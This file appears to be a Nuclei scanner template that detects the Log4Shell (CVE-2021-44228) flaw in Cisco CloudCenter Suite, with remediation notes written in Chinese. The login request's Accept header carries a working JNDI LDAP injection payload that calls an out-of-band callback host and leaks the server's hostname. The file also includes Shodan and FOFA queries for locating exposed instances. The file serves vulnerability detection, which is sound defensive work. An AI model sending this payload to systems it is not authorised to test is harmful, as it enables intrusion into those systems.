id: cisco-cloudcenter-suite-log4j-rce

info:
  name: Cisco CloudCenter Suite (Log4j) - 远程代码执行漏洞
  author: pwnhxl
  severity: critical
  description: Cisco CloudCenter Suite 受 Apache Log4j 相关缺陷影响，攻击者可借助可控日志消息或参数触发 JNDI 解析，从而在目标环境中执行任意代码。该模板通过实际请求与响应特征验证目标是否仍暴露该漏洞面。
  remediation: |
    - 按厂商公告升级相关组件，并确保 Log4j 升级到已修复版本。
    - 同时排查历史日志与主机侧痕迹，确认是否已被利用植入恶意代码或后门。
  reference:
    - https://logging.apache.org/log4j/2.x/security.html
    - http://www.openwall.com/lists/oss-security/2021/12/10/1
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-77,CWE-502
  metadata:
    max-request: 1
    shodan-query: title:"CloudCenter Suite"
    fofa-query: title="CloudCenter Suite"
  tags: cve,cve2021,jndi,log4j,rce,oast,cloudcenter,cisco,kev,vuln
variables:
  rand1: '{{rand_int(111, 999)}}'
  rand2: '{{rand_int(111, 999)}}'

http:
  - raw:
      - |
        @timeout: 10s
        POST /suite-auth/login HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json, text/plain, */${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.accept.{{interactsh-url}}}
        Content-Type: application/json

        {"username":"{{randstr}}@{{randstr}}.com","password":"{{randstr}}","tenantName":"{{randstr}}"}

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - 'X-RateLimit-Limit-suite-gateway_suite-auth'

      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"

      - type: regex
        part: interactsh_request
        regex:
          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'

    extractors:
      - type: kval
        kval:
          - interactsh_ip

      - type: regex
        part: interactsh_request
        group: 2
        regex:
          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'

      - type: regex
        part: interactsh_request
        group: 1
        regex:
          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
